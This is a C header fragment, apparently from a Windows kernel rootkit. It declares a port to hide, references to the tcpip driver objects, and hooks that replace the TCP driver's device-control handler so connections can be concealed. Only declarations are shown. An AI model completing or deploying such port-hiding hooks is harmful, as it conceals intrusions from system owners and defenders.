//#include "ntddk.h"
#include "tdiinfo.h"
#include "ntifs.h"

/*
typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef BYTE * LPBYTE;



PFILE_OBJECT pFile_tcp;
PDEVICE_OBJECT pDev_tcp;
PDRIVER_OBJECT pDrv_tcpip;

DWORD HidePort = 443;  //��ʼ��
*/
#pragma LOCKEDDATA
DWORD HidePort;

#pragma LOCKEDDATA
DWORD processname_offset;

#pragma LOCKEDCODE
PFILE_OBJECT pFile_tcp;

#pragma LOCKEDCODE
PDEVICE_OBJECT pDev_tcp;

#pragma LOCKEDCODE
PDRIVER_OBJECT pDrv_tcpip;

#pragma LOCKEDCODE
PVOID pNowIrpMjDeviceControl;

#pragma LOCKEDCODE
PVOID pIrpMjDeviceControlBakup;

typedef NTSTATUS (*OLDIRPMJDEVICECONTROL)(IN PDEVICE_OBJECT, IN PIRP);
OLDIRPMJDEVICECONTROL OldIrpMjDeviceControl;

NTSTATUS InstallTCPDriverHook();
NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT, IN PIRP);

NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT, IN PIRP, IN PVOID);
